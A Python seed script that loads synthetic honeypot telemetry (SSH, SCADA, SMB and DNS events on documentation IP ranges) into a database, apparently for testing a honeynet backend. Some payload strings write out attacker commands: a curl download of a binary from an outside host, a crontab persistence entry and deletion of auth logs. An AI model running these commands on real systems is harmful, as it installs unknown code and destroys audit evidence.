"""
Reproducible Seed Script for Synthetic Demo Honeynet Telemetry
RFC 5737 Documentation IP Ranges Used:
- 192.0.2.0/24   (TEST-NET-1)
- 198.51.100.0/24 (TEST-NET-2)
- 203.0.113.0/24  (TEST-NET-3)

All records are explicitly labeled with data_origin="synthetic" and must NOT be interpreted as live attacks.
This script is safe to rerun multiple times without creating duplicate records.
"""

import sys
import os
from datetime import datetime, timezone, timedelta

# Ensure parent path is in sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from backend.app.database import SessionLocal, init_db
from backend.app.models.telemetry import TelemetryEventCreate
from backend.app.services.ingestion import ingest_telemetry_event

def seed_synthetic_telemetry():
    print("[*] Initializing database schema...")
    init_db()
    db = SessionLocal()

    now = datetime.now(timezone.utc)

    # Deterministic synthetic events across RFC 5737 documentation blocks
    synthetic_records = [
        # --- BENIGN OBSERVATIONS ---
        TelemetryEventCreate(
            event_id="synth-rfc5737-benign-001",
            timestamp=now - timedelta(minutes=45),
            session_id="synth-sess-benign-01",
            honeypot_id="decoy-gateway-sensor",
            honeypot_type="network",
            source_ip="192.0.2.10",
            source_port=53210,
            destination_ip="192.0.2.1",
            destination_port=123,
            protocol="UDP",
            event_type="network_probe",
            username=None,
            payload="Synthetic test observation: Routine NTP time synchronization request",
            data_origin="synthetic"
        ),
        TelemetryEventCreate(
            event_id="synth-rfc5737-benign-002",
            timestamp=now - timedelta(minutes=40),
            session_id="synth-sess-benign-02",
            honeypot_id="decoy-web-sensor-01",
            honeypot_type="http",
            source_ip="192.0.2.25",
            source_port=49811,
            destination_ip="192.0.2.100",
            destination_port=80,
            protocol="TCP",
            event_type="http_request",
            username=None,
            payload="Synthetic test observation: GET /robots.txt HTTP/1.1 (Benign Search Indexer)",
            data_origin="synthetic"
        ),
        TelemetryEventCreate(
            event_id="synth-rfc5737-benign-003",
            timestamp=now - timedelta(minutes=35),
            session_id="synth-sess-benign-03",
            honeypot_id="decoy-dns-sensor",
            honeypot_type="dns",
            source_ip="198.51.100.12",
            source_port=58900,
            destination_ip="198.51.100.5",
            destination_port=53,
            protocol="UDP",
            event_type="dns_query",
            username=None,
            payload="Synthetic test observation: Standard DNS A query for internal-health.test",
            data_origin="synthetic"
        ),

        # --- SUSPICIOUS-LOOKING OBSERVATIONS (TEST SCENARIO 1: CREDENTIAL GUESSING & RECON) ---
        TelemetryEventCreate(
            event_id="synth-rfc5737-susp-001",
            timestamp=now - timedelta(minutes=30),
            session_id="synth-sess-recon-101",
            honeypot_id="cowrie-ssh-decoy-01",
            honeypot_type="ssh",
            source_ip="198.51.100.50",
            source_port=41200,
            destination_ip="198.51.100.1",
            destination_port=22,
            protocol="TCP",
            event_type="auth_attempt",
            username="admin",
            payload="Synthetic test observation: Simulated failed authentication (admin/test1234)",
            data_origin="synthetic"
        ),
        TelemetryEventCreate(
            event_id="synth-rfc5737-susp-002",
            timestamp=now - timedelta(minutes=28),
            session_id="synth-sess-recon-101",
            honeypot_id="cowrie-ssh-decoy-01",
            honeypot_type="ssh",
            source_ip="198.51.100.50",
            source_port=41201,
            destination_ip="198.51.100.1",
            destination_port=22,
            protocol="TCP",
            event_type="auth_attempt",
            username="service_acc",
            payload="Synthetic test observation: Simulated honeypot login accepted (service_acc)",
            data_origin="synthetic"
        ),
        TelemetryEventCreate(
            event_id="synth-rfc5737-susp-003",
            timestamp=now - timedelta(minutes=25),
            session_id="synth-sess-recon-101",
            honeypot_id="cowrie-ssh-decoy-01",
            honeypot_type="ssh",
            source_ip="198.51.100.50",
            source_port=41202,
            destination_ip="198.51.100.1",
            destination_port=22,
            protocol="TCP",
            event_type="command_execution",
            username="service_acc",
            payload="Synthetic test observation: whoami; id; uname -a; cat /etc/issue",
            data_origin="synthetic"
        ),

        # --- SUSPICIOUS-LOOKING OBSERVATIONS (TEST SCENARIO 2: STAGED MALWARE DROP & PERSISTENCE) ---
        TelemetryEventCreate(
            event_id="synth-rfc5737-susp-004",
            timestamp=now - timedelta(minutes=20),
            session_id="synth-sess-recon-101",
            honeypot_id="cowrie-ssh-decoy-01",
            honeypot_type="ssh",
            source_ip="198.51.100.50",
            source_port=41203,
            destination_ip="198.51.100.1",
            destination_port=22,
            protocol="TCP",
            event_type="command_execution",
            username="service_acc",
            payload="Synthetic test observation: curl -s http://198.51.100.200/sample_agent.bin -o /tmp/.test_agent",
            data_origin="synthetic"
        ),
        TelemetryEventCreate(
            event_id="synth-rfc5737-susp-005",
            timestamp=now - timedelta(minutes=15),
            session_id="synth-sess-recon-101",
            honeypot_id="cowrie-ssh-decoy-01",
            honeypot_type="ssh",
            source_ip="198.51.100.50",
            source_port=41204,
            destination_ip="198.51.100.1",
            destination_port=22,
            protocol="TCP",
            event_type="command_execution",
            username="service_acc",
            payload="Synthetic test observation: (crontab -l; echo '0 * * * * /tmp/.test_agent') | crontab -",
            data_origin="synthetic"
        ),
        TelemetryEventCreate(
            event_id="synth-rfc5737-susp-006",
            timestamp=now - timedelta(minutes=10),
            session_id="synth-sess-recon-101",
            honeypot_id="cowrie-ssh-decoy-01",
            honeypot_type="ssh",
            source_ip="198.51.100.50",
            source_port=41205,
            destination_ip="198.51.100.1",
            destination_port=22,
            protocol="TCP",
            event_type="command_execution",
            username="service_acc",
            payload="Synthetic test observation: history -c && rm -f /var/log/auth.log",
            data_origin="synthetic"
        ),

        # --- SUSPICIOUS-LOOKING OBSERVATIONS (TEST SCENARIO 3: ICS/SCADA & SMB PROBES) ---
        TelemetryEventCreate(
            event_id="synth-rfc5737-susp-007",
            timestamp=now - timedelta(minutes=8),
            session_id="synth-sess-scada-202",
            honeypot_id="conpot-modbus-decoy",
            honeypot_type="scada",
            source_ip="203.0.113.88",
            source_port=59011,
            destination_ip="203.0.113.10",
            destination_port=502,
            protocol="TCP",
            event_type="port_scan",
            username=None,
            payload="Synthetic test observation: Modbus Function 43 Diagnostic Query to PLC Honeypot",
            data_origin="synthetic"
        ),
        TelemetryEventCreate(
            event_id="synth-rfc5737-susp-008",
            timestamp=now - timedelta(minutes=5),
            session_id="synth-sess-smb-303",
            honeypot_id="dionaea-smb-decoy",
            honeypot_type="smb",
            source_ip="203.0.113.88",
            source_port=59012,
            destination_ip="203.0.113.20",
            destination_port=445,
            protocol="TCP",
            event_type="port_scan",
            username=None,
            payload="Synthetic test observation: SMB Negotiate Protocol dialect probe",
            data_origin="synthetic"
        )
    ]

    inserted = 0
    skipped = 0

    try:
        for record in synthetic_records:
            _, is_duplicate = ingest_telemetry_event(record, db)
            if is_duplicate:
                skipped += 1
            else:
                inserted += 1

        print(f"[OK] Seeding completed successfully.")
        print(f"    New synthetic events inserted: {inserted}")
        print(f"    Existing records safely skipped: {skipped}")
        print(f"    Total synthetic scenario records: {len(synthetic_records)}")
    finally:
        db.close()

if __name__ == "__main__":
    seed_synthetic_telemetry()
